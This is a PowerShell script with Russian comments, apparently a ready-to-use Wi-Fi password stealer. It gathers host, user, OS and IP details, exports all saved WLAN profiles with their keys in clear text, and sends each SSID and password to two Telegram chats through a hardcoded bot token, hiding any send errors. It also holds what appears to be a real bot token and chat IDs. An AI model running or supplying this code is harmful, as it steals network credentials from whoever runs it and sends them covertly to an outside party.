# Токен бота и ID чатов (замените при необходимости)
$T = "7560672568:AAG101Gc5sCKApD7ypIxYdlfO0Stf0dKRvk"
$C = "1861565103"
$ExtraId = "5029229924"

# Собираем информацию о системе
$os = (Get-CimInstance Win32_OperatingSystem).Caption + " " + (Get-CimInstance Win32_OperatingSystem).Version
$comp = $env:COMPUTERNAME
$user = $env:USERNAME

# Пытаемся получить IPv4 адрес(а) активного сетевого адаптера
$activeAdapter = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -First 1
if ($activeAdapter) {
    $ips = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $activeAdapter.Name -ErrorAction SilentlyContinue |
            Where-Object { $_.IPAddress -and $_.PrefixLength -ne 127 } |
            Select-Object -ExpandProperty IPAddress) -join ", "
} else {
    $ips = ""
}

# Если не нашлось по активному адаптеру — пробуем все адаптеры
if (-not $ips) {
    $ips = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
            Where-Object { $_.IPAddress -and $_.PrefixLength -ne 127 } |
            Select-Object -ExpandProperty IPAddress) -join ", "
}

if (-not $ips) { $ips = "NoIPv4" }

$header = "Computer: $comp`nUser: $user`nOS: $os`nIP: $ips"

# Экспорт профилей WLAN (ключи в открытом виде) в папку профиля пользователя
netsh wlan export profile key=clear folder="$env:USERPROFILE" > $null 2>&1

# Обход сгенерированных XML-файлов и отправка данных
Get-ChildItem -Path $env:USERPROFILE -Filter *.xml -File | ForEach-Object {
    $file = $_

    # Загружаем XML
    $doc = New-Object System.Xml.XmlDocument
    try {
        $doc.Load($file.FullName)
    } catch {
        return
    }

    # Работа с пространством имен, если оно есть
    $ns = $doc.DocumentElement.NamespaceURI
    $nsm = New-Object System.Xml.XmlNamespaceManager($doc.NameTable)
    if ($ns) { $nsm.AddNamespace("w", $ns) }

    # Поиск узлов имени профиля и ключа
    if ($ns) {
        $nameNode = $doc.SelectSingleNode("//w:name", $nsm)
        $keyNode  = $doc.SelectSingleNode("//w:keyMaterial", $nsm)
    } else {
        $nameNode = $doc.SelectSingleNode("//name")
        $keyNode  = $doc.SelectSingleNode("//keyMaterial")
    }

    $ssid = if ($nameNode) { $nameNode.InnerText } else { "<no name>" }
    $key  = if ($keyNode)  { $keyNode.InnerText  } else { "<no key>" }

    $text = "$header`nFile: $($file.Name)`nSSID: $ssid`nKey: $key"

    # Отправляем сообщение в оба чата
    foreach ($chat in @($C, $ExtraId)) {
        try {
            Invoke-RestMethod -Uri "https://api.telegram.org/bot$T/sendMessage" -Method Post -Body @{ chat_id = $chat; text = $text }
        } catch {
            # подавляем ошибки отправки
        }
    }
}
